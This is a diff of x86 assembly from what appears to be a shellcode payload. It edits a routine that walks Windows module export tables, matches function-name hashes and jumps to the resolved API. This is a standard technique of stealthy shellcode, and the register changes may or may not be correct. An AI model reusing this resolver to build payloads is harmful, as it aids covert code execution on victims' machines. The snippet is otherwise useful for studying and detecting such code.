@@ -56,7 +56,6 @@ payload:
 ; Note: This function assumes the direction flag has allready been cleared via a CLD instruction.
 ; Note: This function is unable to call forwarded exports.	
 api_call:
-
 	pushad			;save all registers
 	mov ebp,esp		; set ebp to stack frame pointer
 	xor edx,edx		
@@ -80,7 +79,7 @@ next_mod:
 get_next_func:
 	jecxz get_next_mod
 	dec ecx					; decrease ecx
-	mov esi,[eax+4*ecx]		; esi = current name RVA
+	mov esi,[ebx+ ecx * 4]		; esi = current name RVA
 	add esi,edx				; esi = &name
 	xor edi,edi				; edi = 0 to hold the function hash 
 	xor eax,eax
@@ -92,16 +91,16 @@ loop_funcname:
 	add edi,eax				; add byte from eax to edi
 	jmp loop_funcname		; loop till end of string reached
 compute_hash_finished:
-	cmp edi,[esp+0x24]		; compare computed hash with reuested hash
+	cmp edi,[ebp+0x24]		; compare computed hash with reuested hash
 	jnz get_next_func
 	; if found fix up stack and jump to function
 	pop eax					; pop current MOdule Export Table
 	mov ebx,[eax+0x24]		; ebx = RVA of Ordinals table
 	add ebx,edx				; ebx = &of ordinals table
-	mov cx,[ebx+2*ecx]		; cx = function ordinal RVA
+	mov cx,[ebx+ 2 * ecx]		; cx = function ordinal RVA
 	mov ebx,[eax+0x1c]		; ebx  = Address table RVA
 	add ebx,edx				; ebx  = &addresstable
-	mov eax,[ebx + 4*ecx]	; eax = current function RVA
+	mov eax,[ebx + 4 * ecx]	; eax = current function RVA
 	add eax,edx				; eax  = &function
 ; we know fixup the stack and callup the function
 finish:
